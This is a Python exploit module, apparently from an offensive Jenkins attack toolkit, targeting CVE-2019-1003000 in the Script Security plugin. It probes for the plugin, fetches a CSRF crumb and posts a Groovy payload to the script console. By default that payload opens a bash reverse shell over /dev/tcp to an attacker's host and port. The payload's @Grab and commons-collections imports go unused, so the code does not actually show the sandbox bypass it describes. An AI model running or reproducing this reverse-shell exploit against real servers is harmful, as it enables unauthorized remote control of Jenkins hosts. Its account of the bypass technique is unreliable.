"""
CVE-2019-1003000: Script Security Plugin Sandbox Bypass via AST Transformation

Script Security sandbox protection could be circumvented by providing AST transforming
annotations before these were blocked in later versions.
"""

from typing import Any

from jenkins_breaker.core.authentication import CrumbManager
from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2019_1003000(ExploitModule):
    """Script Security sandbox bypass using @Grab and other AST transforming annotations."""

    CVE_ID = "CVE-2019-1003000"

    METADATA = ExploitMetadata(
        cve_id="CVE-2019-1003000",
        name="Script Security Sandbox Bypass via AST Transformations",
        description="Sandbox bypass using @Grab and other AST transforming annotations",
        affected_versions=["<= 1.50", "<= 1.49"],
        mitre_attack=["T1190", "T1059"],
        severity="high",
        references=[
            "https://jenkins.io/security/advisory/2019-01-28/",
            "https://nvd.nist.gov/vuln/detail/CVE-2019-1003000",
            "https://gist.github.com/adamyordan/96da0ad5e72cbc97285f2df340cac43b"
        ],
        requires_auth=True,
        requires_crumb=True,
        tags=["rce", "sandbox-bypass", "groovy", "ast"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance has vulnerable Script Security plugin.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if vulnerable, False otherwise
        """
        try:
            response = session.get("/pluginManager/api/json?depth=1")

            if response.status_code == 200:
                data = response.json()
                for plugin in data.get('plugins', []):
                    if plugin.get('shortName') == 'script-security':
                        return True
            return False
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2019-1003000 using AST transformation annotations.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments (lhost, lport, cmd)

        Returns:
            ExploitResult: Result of the exploit
        """
        lhost = kwargs.get('lhost')
        lport = kwargs.get('lport')
        cmd = kwargs.get('cmd', f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' if lhost and lport else None)

        if not cmd:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details="No command provided (lhost/lport or cmd required)",
                error="Missing required parameter: cmd or lhost+lport"
            )

        payload = f'''
@Grab(group='commons-collections', module='commons-collections', version='3.2.2')
import org.apache.commons.collections.functors.InvokerTransformer
import org.apache.commons.collections.functors.ChainedTransformer
import org.apache.commons.collections.functors.ConstantTransformer
import org.apache.commons.collections.map.LazyMap

def command = ['/bin/bash', '-c', '{cmd}']
def rt = Runtime.getRuntime()
def proc = rt.exec(command as String[])
proc.waitFor()
println "Command executed"
'''

        try:
            crumb_manager = CrumbManager(
                base_url=session.base_url,
                auth=session.auth,
                verify_ssl=False
            )
            crumb_manager.fetch()

            headers = crumb_manager.get_header()

            data = {
                'script': payload
            }

            response = session.post("/script", data=data, headers=headers)

            if response.status_code == 200:
                if 'Result' in response.text or 'Command executed' in response.text:
                    return ExploitResult(
                        exploit=self.CVE_ID,
                        status="success",
                        details="Sandbox bypassed via @Grab annotation, command executed",
                        data={
                            "command": cmd,
                            "method": "@Grab AST transformation",
                            "endpoint": "script console"
                        }
                    )
                else:
                    return ExploitResult(
                        exploit=self.CVE_ID,
                        status="partial",
                        details="Script submitted but execution result unclear"
                    )
            elif response.status_code == 403:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details="Access denied - insufficient permissions for script console"
                )
            else:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details=f"Exploit failed with HTTP {response.status_code}"
                )

        except Exception as e:
            if 'timeout' in str(e).lower():
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="partial",
                    details="Timeout during execution - command may have executed successfully"
                )

            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Execution error: {str(e)}"
            )
